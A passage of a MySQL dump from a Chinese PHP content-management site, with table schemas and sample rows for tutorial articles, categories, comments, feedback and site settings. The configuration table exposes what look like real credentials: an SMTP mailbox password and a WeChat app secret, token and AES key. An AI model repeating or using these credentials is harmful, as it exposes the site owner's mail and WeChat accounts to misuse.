So&amp;#39;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;3、字符串首字符转成大写&lt;/p&gt;\r\n\r\n&lt;p&gt;该函数的作用是将字符串的第一个字符改成大写，该函数返回首字符大写的字符串。&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nucfirst();=\r\necho ucfirst(&amp;#39;hello world!&amp;#39;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;4、字符串每个单词的首字符转成大写&lt;/p&gt;\r\n\r\n&lt;p&gt;该函数将传入的字符串的每个单词的首字符变成大写.如&amp;quot;hello world&amp;quot;,经过该函数处理后,将返回&amp;quot;Hello Word&amp;quot;.&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nucwords();=\r\necho ucfirst(&amp;#39;hello world!&amp;#39;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;5、第一个词首字母小写&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nlcfirst();\r\necho lcfirst(&amp;#39;HELLO WORLD!&amp;#39;);&lt;/pre&gt;','',3,0,1,0,0,0,0,8,1,'','',1,'',0,0,1474964849,1474964849,NULL,0,'zh-cn'),(8,'javascript与jquery常用函数与方法','','javascript与jquery常用函数与方法','&lt;h1 style=&quot;text-align:center&quot;&gt;&lt;strong&gt;javascript&lt;/strong&gt;&lt;/h1&gt;\r\n\r\n&lt;p&gt;字符或数字转整数&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nvar num =&amp;nbsp;parseInt(&amp;#39;3.14&amp;#39;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;字符或数字转浮点数&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nvar num =&amp;nbsp;parseFloat(&amp;#39;314.15&amp;#39;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;字符转数组&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nvar array = str.split(&amp;quot;分割符 如:-或,&amp;quot;);&lt;/pre&gt;\r\n\r\n&lt;h1 style=&quot;text-align:center&quot;&gt;&lt;strong&gt;jQuery&lt;/strong&gt;&lt;/h1&gt;\r\n\r\n&lt;p&gt;遍历所有元素(获得所有元素的值)&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nvar val = $(&amp;quot;#id option&amp;quot;).map(function(){return $(this).val();}).get();\r\nvar text = $(&amp;quot;#id option&amp;quot;).map(function(){return $(this).text();}).get();&lt;/pre&gt;\r\n\r\n&lt;p&gt;删除元素&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n$(&amp;quot;#id&amp;quot;).find(&amp;quot;option&amp;quot;).remove();\r\n$(&amp;quot;#id option&amp;quot;).remove();\r\n$(&amp;quot;#id&amp;quot;).nextAll().remove(); //删除指定元素后的所有元素&lt;/pre&gt;\r\n\r\n&lt;p&gt;追加或添加元素&lt;/p&gt;\r\n\r\n&lt;pre&gt;$(&amp;quot;#id&amp;quot;).append(&amp;quot;添加元素&amp;quot;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;获得元素的值或文本&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nvar val = $(&amp;quot;#id&amp;quot;).find(&amp;quot;option:selected&amp;quot;).val(); //获得选中的option值\r\nvar text = $(&amp;quot;#id&amp;quot;).find(&amp;quot;option:selected&amp;quot;).text(); //获得选中的option文本内容\r\nvar val = $(&amp;quot;#id&amp;quot;).val();\r\nvar text = $(&amp;quot;#id&amp;quot;).text();&lt;/pre&gt;','',2,0,1,0,0,0,0,10,0,'','',1,'',0,0,1474965758,1474965816,NULL,0,'zh-cn'),(9,'Touchshow 微演示 PPT/PDF 轻松发手机','','PPT/PDF 轻松发手机，Touchshow微演示 -- 内容发布好工具','&lt;p&gt;啥都不说了都是泪，直接上图吧!&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;./Uploads/images/201609/57eb816195772.png&quot; /&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;上次找了个在线编辑的PPT网站，老板看不上不是他想要的。这次找到了这个，PPT上传直接转网页播放。可惜老板还是看不上，说要能在线编辑的。唉~~~~都是泪啊。。。&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;a href=&quot;http://ts.whytouch.com/index.php&quot; target=&quot;_blank&quot;&gt;官方网站&lt;/a&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;另:这是要收费的。比较这个我还是喜欢&lt;a href=&quot;http://www.niphp.com/index.php?m=home&amp;amp;c=index&amp;amp;a=article&amp;amp;cid=2&amp;amp;id=6&quot; target=&quot;_blank&quot;&gt;reveal-js&lt;/a&gt;&lt;/p&gt;','',2,0,1,0,0,0,0,2,0,'','',1,'',0,0,1475052165,1475052218,NULL,0,'zh-cn'),(11,'测试标题1','测试标题1','测试标题1','&lt;p&gt;测试标题1测试标题1测试标题1测试标题1测试标题1&lt;/p&gt;','',3,0,1,0,0,0,0,0,0,'','',1,'',0,0,1479794676,1479797918,1479797918,0,'zh-cn');
/*!40000 ALTER TABLE `np_article` ENABLE KEYS */;

#
# Structure for table "np_article_data"
#

DROP TABLE IF EXISTS `np_article_data`;
CREATE TABLE `np_article_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '文章ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='文章扩展表';

#
# Data for table "np_article_data"
#


#
# Structure for table "np_banner"
#

DROP TABLE IF EXISTS `np_banner`;
CREATE TABLE `np_banner` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '父ID',
  `name` varchar(255) NOT NULL COMMENT '幻灯片名',
  `title` varchar(255) NOT NULL DEFAULT '' COMMENT '图片标题',
  `width` smallint(4) NOT NULL DEFAULT '0' COMMENT '图片宽',
  `height` smallint(4) NOT NULL DEFAULT '0' COMMENT '图片高',
  `image` varchar(255) NOT NULL DEFAULT '' COMMENT '图片',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `pid` (`pid`),
  KEY `title` (`title`),
  KEY `sort` (`sort`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='幻灯片表';

#
# Data for table "np_banner"
#


#
# Structure for table "np_category"
#

DROP TABLE IF EXISTS `np_category`;
CREATE TABLE `np_category` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '父ID',
  `name` varchar(255) NOT NULL COMMENT '栏目名',
  `aliases` varchar(255) NOT NULL DEFAULT '' COMMENT '别名',
  `seo_title` varchar(255) NOT NULL DEFAULT '' COMMENT 'SEO标题',
  `seo_keywords` varchar(255) NOT NULL DEFAULT '' COMMENT 'SEO关键词',
  `seo_description` varchar(555) NOT NULL DEFAULT '' COMMENT 'SEO描述',
  `image` varchar(255) NOT NULL DEFAULT '' COMMENT '图标',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `model_id` smallint(6) unsigned NOT NULL COMMENT '模型ID',
  `is_show` tinyint(1) unsigned NOT NULL DEFAULT '1' COMMENT '显示',
  `is_channel` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '频道页',
  `sort` smallint(5) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `access_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '权限',
  `url` varchar(255) NOT NULL DEFAULT '' COMMENT '外链地址',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `aliases` (`aliases`),
  KEY `pid` (`pid`),
  KEY `type_id` (`type_id`),
  KEY `model_id` (`model_id`),
  KEY `is_show` (`is_show`),
  KEY `access_id` (`access_id`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=utf8 COMMENT='栏目表';

#
# Data for table "np_category"
#

/*!40000 ALTER TABLE `np_category` DISABLE KEYS */;
INSERT INTO `np_category` VALUES (1,0,'友情链接','link','','','展示本站所有友情站点，排列不分先后；如需友链，请先添加本站首页链接后再评论告知（小说站、下载站、采集站请勿扰，性格不符）。','',1,8,1,0,0,0,'',0,0,'zh-CN'),(2,0,'前端开发','','','前端开发学习,前端开发,前端开发技巧,前端工程师,web前端开发,网站前端开发,网站建设,网站开发','提供html(html5)、css(css3)、javascript、jQuery等前端开发知识和技巧','',2,1,1,0,2,0,'',0,0,'zh-CN'),(3,0,'程序开发','','','程序开发学习,程序开发,程序开发技巧,网站工程师,web程序开发,网站程序开发,网站建设,网站开发','提供php、mysql、框架等程序开发知识和技巧','',2,1,1,0,1,0,'',0,0,'zh-CN'),(4,0,'关于我','','','','','',1,4,1,0,0,0,'',0,0,'zh-cn'),(12,0,'测试下载模型','','','','','',1,3,1,0,0,0,'',1479696396,1479696396,'zh-cn'),(13,0,'测试图片模型','','','','','',1,2,1,0,0,0,'',1479696422,1479696422,'zh-cn'),(14,0,'测试产品模型','','','','','',1,7,1,0,0,0,'',1479696451,1479696451,'zh-cn'),(15,0,'测试反馈模型','','','','','',1,5,1,0,0,0,'',1479696466,1479696466,'zh-cn'),(16,0,'测试留言模型','','','','','',1,6,1,0,0,0,'',1479696486,1479696486,'zh-cn');
/*!40000 ALTER TABLE `np_category` ENABLE KEYS */;

#
# Structure for table "np_comment"
#

DROP TABLE IF EXISTS `np_comment`;
CREATE TABLE `np_comment` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `category_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '栏目ID',
  `content_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '内容ID',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '用户ID',
  `pid` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '父ID',
  `content` varchar(1000) NOT NULL COMMENT '评论内容',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `is_report` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '举报',
  `support` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '支持',
  `report_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '举报时间',
  `ip` varchar(15) NOT NULL DEFAULT '' COMMENT '评论IP',
  `ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT '评论IP地区',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `content_id` (`content_id`),
  KEY `user_id` (`user_id`),
  KEY `pid` (`pid`),
  KEY `is_pass` (`is_pass`),
  KEY `is_report` (`is_report`),
  KEY `report_time` (`report_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='评论表';

#
# Data for table "np_comment"
#

/*!40000 ALTER TABLE `np_comment` DISABLE KEYS */;
INSERT INTO `np_comment` VALUES (1,3,7,1,0,'ffffffffffffffff',1,0,0,0,'0.0.0.0','IANA保留地址',1475718989,'zh-cn');
/*!40000 ALTER TABLE `np_comment` ENABLE KEYS */;

#
# Structure for table "np_comment_report"
#

DROP TABLE IF EXISTS `np_comment_report`;
CREATE TABLE `np_comment_report` (
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `comment_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论ID',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '用户ID',
  `ip` varchar(15) NOT NULL DEFAULT '' COMMENT 'IP',
  `ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT 'IP地区',
  KEY `comment_id` (`comment_id`),
  KEY `user_id` (`user_id`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='评论举报表';

#
# Data for table "np_comment_report"
#

/*!40000 ALTER TABLE `np_comment_report` DISABLE KEYS */;
INSERT INTO `np_comment_report` VALUES (0,2,0,'0.0.0.0','IANA保留地址');
/*!40000 ALTER TABLE `np_comment_report` ENABLE KEYS */;

#
# Structure for table "np_comment_support"
#

DROP TABLE IF EXISTS `np_comment_support`;
CREATE TABLE `np_comment_support` (
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `comment_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论ID',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '用户ID',
  `ip` varchar(15) NOT NULL DEFAULT '' COMMENT 'IP',
  `ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT 'IP地区',
  KEY `comment_id` (`comment_id`),
  KEY `user_id` (`user_id`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='评论支持表';

#
# Data for table "np_comment_support"
#


#
# Structure for table "np_config"
#

DROP TABLE IF EXISTS `np_config`;
CREATE TABLE `np_config` (
  `id` smallint(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL COMMENT '名称',
  `value` varchar(500) NOT NULL COMMENT '值',
  `lang` varchar(20) NOT NULL COMMENT '语言 niphp为全局设置',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `value` (`value`(333)),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=49 DEFAULT CHARSET=utf8 COMMENT='设置表';

#
# Data for table "np_config"
#

/*!40000 ALTER TABLE `np_config` DISABLE KEYS */;
INSERT INTO `np_config` VALUES (1,'system_portal','hor','niphp'),(2,'content_check','1','niphp'),(3,'member_login_captcha','1','niphp'),(4,'website_submit_captcha','1','niphp'),(5,'upload_file_max','5','niphp'),(6,'upload_file_type','jpg|gif|png','niphp'),(7,'website_static','0','niphp'),(8,'smtp_host','smtp.qq.com','niphp'),(9,'smtp_port','25','niphp'),(10,'smtp_username','levisun.mail@qq.com','niphp'),(11,'smtp_password','ehesr1fcvhj6w0bbw1mo','niphp'),(12,'smtp_from_email','levisun.mail@qq.com','niphp'),(13,'smtp_from_name','niphp','niphp'),(14,'wechat_token','vcoaur13959748401','niphp'),(15,'wechat_encodingaeskey','bmknlqjy2hwxkeymsffnvabyzjdqw8r0lahkevevq9s','niphp'),(16,'wechat_appid','wx5b906f26f9d9e621','niphp'),(17,'wechat_appsecret','53028b1fb3cda6efb99e84c4667d9fb2','niphp'),(18,'website_name','腐朽的木屋_php编程与前端开发','zh-cn'),(19,'website_keywords','php,phpcms,php源码,php 框架,php开发工具,企业网站模板,免费网站psd模板,niphpcms','zh-cn'),(20,'website_description','腐朽的木屋是一个提供最新的php资讯、php技术、php编程技巧、前端开发、设计素材、psd模板的网站。','zh-cn'),(21,'bottom_message','&lt;a href=&quot;http://www.miitbeian.gov.cn&quot; target=&quot;_blank&quot;&gt;陕icp备15001502号-1&lt;/a&gt;','zh-cn'),(22,'copyright','copyright © 2014-2015 &lt;a href=&quot;http://www.niphp.com&quot; target=&quot;_blank&quot;&gt;niphp.com&lt;/a&gt;版权所有','zh-cn'),(23,'script','&lt;script src=&quot;https://s4.cnzz.com/z_stat.php?id=1255299626&amp;web_id=1255299626&quot; language=&quot;JavaScript&quot;&gt;&lt;/script&gt;\r\n&lt;script&gt;\r\nvar _hmt = _hmt || [];\r\n(function() {\r\n  var hm = document.createElement(&quot;script&quot;);\r\n  hm.src = &quot;//hm.baidu.com/hm.js?10513d684eab5a784b249cd5f32f9c03&quot;;\r\n  var s = document.getElementsByTagName(&quot;script&quot;)[0]; \r\n  s.parentNode.insertBefore(hm, s);\r\n})();\r\n&lt;/script&gt;','zh-cn'),(24,'auto_image','1','zh-cn'),(25,'add_water','1','zh-cn'),(26,'water_type','1','zh-cn'),(27,'water_location','1','zh-cn'),(28,'water_text','niphp','zh-cn'),(29,'water_image','data/upload/20150209/54d8743270fbf.png','zh-cn'),(30,'article_module_width','200','zh-cn'),(31,'article_module_height','150','zh-cn'),(32,'ask_module_width','50','zh-cn'),(33,'ask_module_height','50','zh-cn'),(34,'download_module_width','600','zh-cn'),(35,'download_module_height','160','zh-cn'),(36,'job_module_width','200','zh-cn'),(37,'job_module_height','150','zh-cn'),(38,'link_module_width','100','zh-cn'),(39,'link_module_height','50','zh-cn'),(40,'page_module_width','200','zh-cn'),(41,'page_module_height','160','zh-cn'),(42,'picture_module_width','200','zh-cn'),(43,'picture_module_height','150','zh-cn'),(44,'product_module_width','200','zh-cn'),(45,'product_module_height','150','zh-cn'),(46,'index_theme','design','zh-cn'),(47,'member_theme','default','zh-cn'),(48,'mall_theme','default','zh-cn');
/*!40000 ALTER TABLE `np_config` ENABLE KEYS */;

#
# Structure for table "np_download"
#

DROP TABLE IF EXISTS `np_download`;
CREATE TABLE `np_download` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键词',
  `description` varchar(500) NOT NULL DEFAULT '' COMMENT '描述',
  `content` mediumtext NOT NULL COMMENT '内容',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `is_com` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '推荐',
  `is_top` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '置顶',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '最热',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论量',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `origin` varchar(255) NOT NULL DEFAULT '' COMMENT '来源',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '发布人ID',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `is_link` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '跳转',
  `show_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '显示时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `access_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '访问权限',
  `down_url` varchar(500) NOT NULL DEFAULT '' COMMENT '下载链接',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `is_com` (`is_com`),
  KEY `is_top` (`is_top`),
  KEY `is_hot` (`is_hot`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='下载表';

#
# Data for table "np_download"
#

/*!40000 ALTER TABLE `np_download` DISABLE KEYS */;
INSERT INTO `np_download` VALUES (1,'测试标题1','测试标题1','测试标题1','','',12,0,1,0,0,0,0,0,0,'','',1,'',0,0,1479807400,1479887291,1479887291,6,'http://baidu.com','zh-cn');
/*!40000 ALTER TABLE `np_download` ENABLE KEYS */;

#
# Structure for table "np_download_data"
#

DROP TABLE IF EXISTS `np_download_data`;
CREATE TABLE `np_download_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '下载ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='下载扩展表';

#
# Data for table "np_download_data"
#


#
# Structure for table "np_feedback"
#

DROP TABLE IF EXISTS `np_feedback`;
CREATE TABLE `np_feedback` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `content` varchar(500) NOT NULL COMMENT '内容',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `mebmer_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '会员ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `ip` varchar(15) NOT NULL DEFAULT '' COMMENT '评论IP',
  `ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT '评论IP地区',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `lang` varchar(20) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='反馈表';

#
# Data for table "np_feedback"
#

/*!40000 ALTER TABLE `np_feedback` DISABLE KEYS */;
INSERT INTO `np_feedback` VALUES (1,'测试标题','levisun','111111111111',15,0,0,0,'0.0.0.0','IANA保留地址',1481339253,1481339253,0,'zh-cn');
/*!40000 ALTER TABLE `np_feedback` ENABLE KEYS */;

#
# Structure for table "np_feedback_data"
#

DROP TABLE IF EXISTS `np_feedback_data`;
CREATE TABLE `np_feedback_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `main_id` int(11) unsigned NOT NULL COMMENT '反馈ID',
  `fields_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `data` text NOT NULL COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `main_id` (`main_id`),
  KEY `fields_id` (`fields_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='反馈扩展表';

#
# Data for table "np_feedback_data"
#

/*!40000 ALTER TABLE `np_feedback_data` DISABLE KEYS */;
INSERT INTO `np_feedback_data` VALUES (1,1,7,'22222222222222222');
/*!40000 ALTER TABLE `np_feedback_data` ENABLE KEYS */;

#
# Structure for table "np_fields"
#

DROP TABLE IF EXISTS `np_fields`;
CREATE TABLE `np_fields` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `name` varchar(255) NOT NULL DEFAULT '' COMMENT '字段名',
  `description` varchar(555) NOT NULL DEFAULT '' COMMENT '描述',
  `is_require` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '必填',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='自定义字段表';

#
# Data for table "np_fields"
#

/*!40000 ALTER TABLE `np_fields` DISABLE KEYS */;
INSERT INTO `np_fields` VALUES (5,4,1,'测试1','',1),(6,13,1,'测试1','',1),(7,15,1,'imya','',1);
/*!40000 ALTER TABLE `np_fields` ENABLE KEYS */;

#
# Structure for table "np_fields_type"
#

DROP TABLE IF EXISTS `np_fields_type`;
CREATE TABLE `np_fields_type` (
  `id` int(11) unsigned NOT NULL,
  `name` varchar(255) NOT NULL DEFAULT '' COMMENT '类型名',
  `description` varchar(555) NOT NULL DEFAULT '' COMMENT '描述',
  `regex` varchar(255) NOT NULL DEFAULT '' COMMENT '验证方式',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='字段类型表';

#
# Data for table "np_fields_type"
#

/*!40000 ALTER TABLE `np_fields_type` DISABLE KEYS */;
INSERT INTO `np_fields_type` VALUES (1,'text','文本','require'),(2,'number','数字','number'),(3,'email','邮箱','email'),(4,'url','URL地址','url'),(5,'currency','货币','currency'),(6,'abc','字母','/^[A-Za-z]+$/'),(7,'idcards','身份证','/^(d{14}|d{17})(d|[xX])$/'),(8,'phone','移动电话','/^(1)[1-9][1-9][0-9]{8}$/'),(9,'landline','固话','/^d{3,4}-d{7,8}(-d{3,4})?$/'),(10,'age','年龄','/^[1-9][0-9]?[0-9]?$/'),(11,'date','日期','/^d{4}(-|/|.)d{1,2}1d{1,2}$/');
/*!40000 ALTER TABLE `np_fields_type` ENABLE KEYS */;

#
# Structure for table "np_level"
#

DROP TABLE IF EXISTS `np_level`;
CREATE TABLE `np_level` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL COMMENT '组名',
  `integral` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '积分',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '状态',
  `remark` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  PRIMARY KEY (`id`),
  KEY `integral` (`integral`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='会员组';

#
# Data for table "np_level"
#

/*!40000 ALTER TABLE `np_level` DISABLE KEYS */;
INSERT INTO `np_level` VALUES (1,'钻石会员',500000000,1,''),(2,'黄金会员',30000000,1,''),(3,'白金会员',500000,1,''),(4,'VIP会员',3000,1,''),(5,'高级会员',500,1,''),(6,'普通会员',0,1,'');
/*!40000 ALTER TABLE `np_level` ENABLE KEYS */;

#
# Structure for table "np_level_member"
#

DROP TABLE IF EXISTS `np_level_member`;
CREATE TABLE `np_level_member` (
  `user_id` smallint(6) unsigned NOT NULL COMMENT '会员ID',
  `level_id` smallint(6) unsigned DEFAULT NULL COMMENT '组ID',
  PRIMARY KEY (`user_id`),
  KEY `level_id` (`level_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='会员组关系表';

#
# Data for table "np_level_member"
#

/*!40000 ALTER TABLE `np_level_member` DISABLE KEYS */;
INSERT INTO `np_level_member` VALUES (1,6),(3,6);
/*!40000 ALTER TABLE `np_level_member` ENABLE KEYS */;

#
# Structure for table "np_link"
#

DROP TABLE IF EXISTS `np_link`;
CREATE TABLE `np_link` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `logo` varchar(255) NOT NULL DEFAULT '' COMMENT '标志',
  `description` varchar(555) NOT NULL DEFAULT '' COMMENT '描述',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '发布人ID',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=27 DEFAULT CHARSET=utf8 COMMENT='友链表';

#
# Data for table "np_link"
#

/*!40000 ALTER TABLE `np_link` DISABLE KEYS */;
